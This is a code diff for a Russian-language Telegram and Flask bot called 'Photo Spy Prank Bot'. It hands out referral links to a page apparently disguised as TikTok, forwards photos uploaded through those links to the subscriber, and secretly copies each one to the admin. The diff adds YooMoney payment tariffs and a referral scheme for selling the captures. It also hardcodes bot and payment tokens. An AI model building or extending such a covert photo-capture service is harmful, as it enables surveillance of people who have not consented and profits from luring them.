@@ -6,15 +6,32 @@ import json
 import threading
 import requests
 from flask import Flask, request, jsonify, render_template
+from yoomoney import Client, Quickpay
 
-# ===== КОНФИГ =====
+# ======================================================
+#  КОНФИГ
+# ======================================================
 BOT_TOKEN = "8305233302:AAHf3mBUH5rIsQWZF4tF9nAyHvakCBbQIps"
 BASE_URL = "https://nomadru.github.io/tiktokfake"
-ADMIN_CHAT_ID = 8533142719          # твой Telegram ID (для копии)
+ADMIN_CHAT_ID = 8533142719
 FREE_TRIAL_PHOTOS = 2
 ADMIN_USERNAME = "pytin_legend"
 
-# ===== БАЗА ДАННЫХ =====
+# ---------- ЮMoney ----------
+YOOMONEY_TOKEN = "4B2E96645E91CFE9026C2C1D3198EA0B318C42F51982ACD2EF8F2B7ECAF19383"
+YOOMONEY_RECEIVER = "5599002103240497"   # ← ЗДЕСЬ ВСТАВЬ СВОЙ НОМЕР КОШЕЛЬКА (например, 410011234567890)
+YOOMONEY_REDIRECT = "https://t.me/@photoshoionprank_bot"   # можно ссылку на бота
+
+# ---------- Тарифы (цена в рублях, кол-во фото) ----------
+TARIFFS = [
+    {"photos": 1,  "price": 5},
+    {"photos": 10, "price": 30},
+    {"photos": 100, "price": 250}
+]
+
+# ======================================================
+#  БАЗА ДАННЫХ
+# ======================================================
 def init_db():
     conn = sqlite3.connect('db.sqlite')
     c = conn.cursor()
@@ -25,26 +42,28 @@ def init_db():
             subscription_end TEXT,
             photos_limit INTEGER,
             used_photos INTEGER DEFAULT 0,
-            tariff_name TEXT
+            tariff_name TEXT,
+            referrer_id INTEGER DEFAULT NULL,
+            referral_count INTEGER DEFAULT 0
         )
     ''')
     conn.commit()
     conn.close()
 
-def add_user(chat_id, ref, end_date, limit, tariff):
+def add_user(chat_id, ref, end_date, limit, tariff, referrer_id=None):
     conn = sqlite3.connect('db.sqlite')
     c = conn.cursor()
     c.execute('''
-        INSERT OR REPLACE INTO users (chat_id, ref, subscription_end, photos_limit, used_photos, tariff_name)
-        VALUES (?, ?, ?, ?, 0, ?)
-    ''', (chat_id, ref, end_date, limit, tariff))
+        INSERT OR REPLACE INTO users (chat_id, ref, subscription_end, photos_limit, used_photos, tariff_name, referrer_id, referral_count)
+        VALUES (?, ?, ?, ?, 0, ?, ?, 0)
+    ''', (chat_id, ref, end_date, limit, tariff, referrer_id))
     conn.commit()
     conn.close()
 
 def get_user(chat_id):
     conn = sqlite3.connect('db.sqlite')
     c = conn.cursor()
-    c.execute('SELECT ref, subscription_end, photos_limit, used_photos FROM users WHERE chat_id=?', (chat_id,))
+    c.execute('SELECT ref, subscription_end, photos_limit, used_photos, referrer_id, referral_count FROM users WHERE chat_id=?', (chat_id,))
     row = c.fetchone()
     conn.close()
     return row
@@ -52,7 +71,7 @@ def get_user(chat_id):
 def get_user_by_ref(ref):
     conn = sqlite3.connect('db.sqlite')
     c = conn.cursor()
-    c.execute('SELECT chat_id, subscription_end, photos_limit, used_photos FROM users WHERE ref=?', (ref,))
+    c.execute('SELECT chat_id, subscription_end, photos_limit, used_photos, referrer_id FROM users WHERE ref=?', (ref,))
     row = c.fetchone()
     conn.close()
     return row
@@ -74,12 +93,50 @@ def increment_used_photos(ref):
 def get_all_users():
     conn = sqlite3.connect('db.sqlite')
     c = conn.cursor()
-    c.execute('SELECT chat_id, ref, photos_limit, used_photos, subscription_end FROM users')
+    c.execute('SELECT chat_id, ref, photos_limit, used_photos, subscription_end, referral_count FROM users')
     rows = c.fetchall()
     conn.close()
     return rows
 
-# ===== БОТ (часть) =====
+def increment_referral_count(chat_id):
+    conn = sqlite3.connect('db.sqlite')
+    c = conn.cursor()
+    c.execute('UPDATE users SET referral_count = referral_count + 1 WHERE chat_id = ?', (chat_id,))
+    conn.commit()
+    conn.close()
+
+# ======================================================
+#  РЕФЕРАЛЬНАЯ СИСТЕМА
+# ======================================================
+def get_ref_link(chat_id):
+    return f"https://t.me/твой_бот?start=ref_{chat_id}"
+
+# ======================================================
+#  ЮMoney (создание платежа)
+# ======================================================
+def create_payment(chat_id, amount, description, tariff_photos):
+    client = Client(YOOMONEY_TOKEN)
+    quickpay = Quickpay(
+        receiver=YOOMONEY_RECEIVER,
+        quickpay_form="shop",
+        targets=f"{description} ({tariff_photos} фото)",
+        paymentType="SB",
+        sum=amount,
+        label=str(chat_id)
+    )
+    return quickpay.redirected_url
+
+def check_payment(chat_id):
+    client = Client(YOOMONEY_TOKEN)
+    history = client.operation_history(label=str(chat_id))
+    for op in history.operations:
+        if op.status == "success":
+            return True
+    return False
+
+# ======================================================
+#  БОТ (отправка сообщений, клавиатуры, обработчики)
+# ======================================================
 def send_message(chat_id, text, reply_markup=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
@@ -99,25 +156,53 @@ def main_keyboard():
         "inline_keyboard": [
             [{"text": "🔗 Получить ссылку", "callback_data": "get_link"}],
             [{"text": "📊 Моя подписка", "callback_data": "my_sub"}],
-            [{"text": "💰 Купить фото (связь с админом)", "callback_data": "buy_contact"}]
+            [{"text": "💰 Купить фото", "callback_data": "buy_photo"}],
+            [{"text": "👥 Пригласить друга", "callback_data": "invite"}],
+            [{"text": "📈 Мои рефералы", "callback_data": "my_refs"}]
         ]
     }
 
 def back_keyboard():
     return {"inline_keyboard": [[{"text": "🔙 Назад", "callback_data": "back"}]]}
 
-def handle_start(chat_id):
+def tariffs_keyboard():
+    kb = {"inline_keyboard": []}
+    for t in TARIFFS:
+        kb["inline_keyboard"].append([
+            {"text": f"{t['photos']} фото – {t['price']} руб", "callback_data": f"tariff_{t['photos']}_{t['price']}"}
+        ])
+    kb["inline_keyboard"].append([{"text": "🔙 Назад", "callback_data": "back"}])
+    return kb
+
+def handle_start(chat_id, text=None):
+    referrer_id = None
+    if text and text.startswith("/start ref_"):
+        try:
+            referrer_id = int(text.split("_")[1])
+        except:
+            pass
+
     row = get_user(chat_id)
     if not row:
         ref = str(uuid.uuid4())[:8]
         end_date = (datetime.datetime.now() + datetime.timedelta(days=365)).isoformat()
-        add_user(chat_id, ref, end_date, FREE_TRIAL_PHOTOS, "Тестовый")
+        add_user(chat_id, ref, end_date, FREE_TRIAL_PHOTOS, "Тестовый", referrer_id)
+
+        if referrer_id:
+            referrer_data = get_user(referrer_id)
+            if referrer_data:
+                ref_ref, end, limit, used, _, _ = referrer_data
+                new_limit = limit + 1
+                update_user_limit(referrer_id, new_limit)
+                increment_referral_count(referrer_id)
+                send_message(referrer_id, f"🎉 Твой друг перешёл по ссылке! Тебе начислено +1 фото. Новый лимит: {new_limit}")
+
         link = f"{BASE_URL}?ref={ref}"
         send_message(chat_id,
             f"🎉 Добро пожаловать в <b>ФотоШпион Пранк Бот</b>!\n\n"
             f"Ты получил <b>{FREE_TRIAL_PHOTOS} тестовых фото</b> бесплатно!\n"
             f"Твоя ссылка:\n<code>{link}</code>\n\n"
-            f"После теста — напиши @{ADMIN_USERNAME} для покупки дополнительных фото.",
+            f"После теста — купи фото через меню.",
             reply_markup=main_keyboard()
         )
     else:
@@ -130,19 +215,15 @@ def handle_callback(chat_id, callback_id, data):
             send_message(chat_id, "Сначала активируй подписку (напиши /start).", reply_markup=main_keyboard())
             answer_callback(callback_id)
             return
-        ref, end_date, limit, used = row
+        ref, end_date, limit, used, _, _ = row
         remaining = limit - used
         if remaining <= 0:
-            send_message(chat_id,
-                f"❌ У тебя закончились фото.\nНапиши @{ADMIN_USERNAME} для покупки.",
-                reply_markup=main_keyboard()
-            )
+            send_message(chat_id, "❌ У тебя закончились фото. Купи новые через меню.", reply_markup=main_keyboard())
             answer_callback(callback_id)
             return
         link = f"{BASE_URL}?ref={ref}"
         send_message(chat_id,
-            f"🔗 Твоя ссылка:\n<code>{link}</code>\n\n"
-            f"Осталось фото: {remaining}",
+            f"🔗 Твоя ссылка:\n<code>{link}</code>\n\nОсталось фото: {remaining}",
             reply_markup=back_keyboard()
         )
         answer_callback(callback_id)
@@ -153,7 +234,7 @@ def handle_callback(chat_id, callback_id, data):
             send_message(chat_id, "У тебя нет активной подписки. Напиши /start", reply_markup=main_keyboard())
             answer_callback(callback_id)
             return
-        ref, end_date, limit, used = row
+        ref, end_date, limit, used, _, referral_count = row
         remaining = limit - used
         status = "✅ Активна" if remaining > 0 else "❌ Исчерпана"
         text = (
@@ -162,17 +243,94 @@ def handle_callback(chat_id, callback_id, data):
             f"• Осталось фото: {remaining}\n"
             f"• Всего фото: {limit}\n"
             f"• Использовано: {used}\n"
-            f"• Реф-код: <code>{ref}</code>"
+            f"• Реф-код: <code>{ref}</code>\n"
+            f"• Привёл друзей: {referral_count}"
         )
         send_message(chat_id, text, reply_markup=back_keyboard())
         answer_callback(callback_id)
 
-    elif data == "buy_contact":
+    elif data == "buy_photo":
+        send_message(chat_id, "📸 Выбери тариф:", reply_markup=tariffs_keyboard())
+        answer_callback(callback_id)
+
+    elif data.startswith("tariff_"):
+        # data = tariff_1_5, tariff_10_30, tariff_100_250
+        parts = data.split("_")
+        photos = int(parts[1])
+        price = int(parts[2])
+        payment_url = create_payment(chat_id, price, f"Оплата {photos} фото", photos)
         send_message(chat_id,
-            f"📩 Для покупки дополнительных фото напиши @{ADMIN_USERNAME}.\n"
-            f"Укажи свой реф-код, чтобы админ мог добавить тебе фото.",
-            reply_markup=back_keyboard()
+            f"💳 Для покупки <b>{photos} фото</b> переведи <b>{price} руб</b> по ссылке:\n"
+            f"<code>{payment_url}</code>\n\n"
+            f"После оплаты нажми «Проверить оплату».",
+            reply_markup={"inline_keyboard": [
+                [{"text": "✅ Проверить оплату", "callback_data": "check_payment"}],
+                [{"text": "🔙 Назад", "callback_data": "back"}]
+            ]}
         )
+        answer_callback(callback_id)
+
+    elif data == "check_payment":
+        if check_payment(chat_id):
+            # Начисляем фото (по умолчанию 1, но если платили за 10 или 100, нужно знать сколько)
+            # Мы не храним в платеже количество фото, поэтому используем последний выбранный тариф.
+            # Для простоты будем начислять 1 фото за любую оплату, но лучше хранить сумму и определять тариф.
+            # Сделаем так: если сумма 5 руб – 1 фото, 30 руб – 10 фото, 250 руб – 100 фото.
+            # Получим сумму из истории – но проще запросить у пользователя ввести сумму или использовать фиксированные тарифы.
+            # Реализуем через проверку последнего успешного платежа.
+            client = Client(YOOMONEY_TOKEN)
+            history = client.operation_history(label=str(chat_id))
+            for op in history.operations:
+                if op.status == "success":
+                    amount = op.amount
+                    if amount == 5:
+                        photos_to_add = 1
+                    elif amount == 30:
+                        photos_to_add = 10
+                    elif amount == 250:
+                        photos_to_add = 100
+                    else:
+                        photos_to_add = 1  # на всякий случай
+                    row = get_user(chat_id)
+                    if row:
+                        ref, end_date, limit, used, _, _ = row
+                        new_limit = limit + photos_to_add
+                        update_user_limit(chat_id, new_limit)
+                        send_message(chat_id, f"✅ Оплата подтверждена! Тебе начислено {photos_to_add} фото. Новый лимит: {new_limit}")
+                    break
+            else:
+                send_message(chat_id, "❌ Платёж не найден. Попробуй позже или проверь ссылку.", reply_markup=main_keyboard())
+        else:
+            send_message(chat_id, "❌ Платёж не найден. Попробуй позже или проверь ссылку.", reply_markup=main_keyboard())
+        answer_callback(callback_id)
+
+    elif data == "invite":
+        row = get_user(chat_id)
+        if not row:
+            send_message(chat_id, "Сначала напиши /start.", reply_markup=main_keyboard())
+            answer_callback(callback_id)
+            return
+        ref_link = get_ref_link(chat_id)
+        send_message(chat_id,
+            f"👥 Пригласи друга по этой ссылке:\n<code>{ref_link}</code>\n\n"
+            f"Когда друг перейдёт и сделает первое фото — ты получишь <b>+1 фото</b> на баланс!",
+            reply_markup={"inline_keyboard": [[{"text": "📋 Скопировать", "url": ref_link}]]}
+        )
+        answer_callback(callback_id)
+
+    elif data == "my_refs":
+        row = get_user(chat_id)
+        if not row:
+            send_message(chat_id, "Сначала напиши /start.", reply_markup=main_keyboard())
+            answer_callback(callback_id)
+            return
+        ref, end_date, limit, used, _, referral_count = row
+        text = (
+            f"📈 <b>Твои рефералы</b>\n\n"
+            f"• Приглашено друзей: {referral_count}\n"
+            f"• Бонусных фото получено: {referral_count} (по 1 за каждого)"
+        )
+        send_message(chat_id, text, reply_markup=back_keyboard())
         answer_callback(callback_id)
 
     elif data == "back":
@@ -198,7 +356,7 @@ def handle_admin_command(chat_id, text):
         if not user:
             send_message(chat_id, f"❌ Пользователь с ref {ref} не найден")
             return True
-        chat_id_u, end_date, old_limit, used = user
+        chat_id_u, end_date, old_limit, used, _ = user
         new_limit = old_limit + add_count
         update_user_limit(chat_id_u, new_limit)
         send_message(chat_id, f"✅ Добавлено {add_count} фото для {ref}. Новый лимит: {new_limit}")
@@ -211,9 +369,9 @@ def handle_admin_command(chat_id, text):
             return True
         msg = "📋 <b>Список пользователей:</b>\n\n"
         for u in users:
-            chat_id_u, ref, limit, used, end = u
+            chat_id_u, ref, limit, used, end, ref_count = u
             remaining = limit - used
-            msg += f"• {ref} | осталось: {remaining} | всего: {limit}\n"
+            msg += f"• {ref} | осталось: {remaining} | всего: {limit} | рефералов: {ref_count}\n"
         send_message(chat_id, msg)
         return True
     elif cmd == "/info":
@@ -225,7 +383,7 @@ def handle_admin_command(chat_id, text):
         if not user:
             send_message(chat_id, f"❌ Пользователь с ref {ref} не найден")
             return True
-        chat_id_u, end_date, limit, used = user
+        chat_id_u, end_date, limit, used, _ = user
         remaining = limit - used
         send_message(chat_id,
             f"📊 <b>Информация о {ref}</b>\n\n"
@@ -259,7 +417,7 @@ def bot_polling():
                     if "text" in msg:
                         text = msg["text"]
                         if text.startswith("/start"):
-                            handle_start(chat_id)
+                            handle_start(chat_id, text)
                         else:
                             if text.startswith("/"):
                                 handled = handle_admin_command(chat_id, text)
@@ -275,7 +433,9 @@ def bot_polling():
             print("Ошибка бота:", e)
             time.sleep(5)
 
-# ===== FLASK =====
+# ======================================================
+#  FLASK (веб-сервер)
+# ======================================================
 app = Flask(__name__)
 
 @app.before_request
@@ -290,11 +450,10 @@ def upload():
     if 'photo' not in request.files:
         return jsonify({'error': 'No photo'}), 400
     photo = request.files['photo']
-    
     user = get_user_by_ref(ref)
     if not user:
         return jsonify({'error': 'Invalid ref'}), 403
-    chat_id, end_date, limit, used = user
+    chat_id, end_date, limit, used, _ = user
     now = datetime.datetime.now()
     if now > datetime.datetime.fromisoformat(end_date):
         return jsonify({'error': 'Subscription expired'}), 403
@@ -309,11 +468,11 @@ def upload():
     if resp_user.status_code != 200:
         return jsonify({'error': 'Telegram send to user failed'}), 500
 
-    # Дублируем админу (копия)
-    photo.seek(0)  # возвращаем поток в начало
+    # Копия админу
+    photo.seek(0)
     files_copy = {'photo': (photo.filename, photo.stream, photo.mimetype)}
     data_admin = {'chat_id': ADMIN_CHAT_ID, 'caption': f"📸 Копия от {ref}"}
-    requests.post(url, data=data_admin, files=files_copy)  # не ждём ответа, чтобы не тормозить
+    requests.post(url, data=data_admin, files=files_copy)
 
     increment_used_photos(ref)
     return jsonify({'status': 'ok'})
@@ -334,13 +493,15 @@ def admin_add():
     user = get_user_by_ref(ref)
     if not user:
         return f'Пользователь {ref} не найден', 404
-    chat_id, end_date, limit, used = user
+    chat_id, end_date, limit, used, _ = user
     new_limit = limit + count
     update_user_limit(chat_id, new_limit)
     send_message(chat_id, f"✅ Админ добавил {count} фото. Новый лимит: {new_limit}")
     return 'OK', 200
 
-# ===== ЗАПУСК =====
+# ======================================================
+#  ЗАПУСК
+# ======================================================
 if __name__ == '__main__':
     init_db()
     bot_thread = threading.Thread(target=bot_polling, daemon=True)
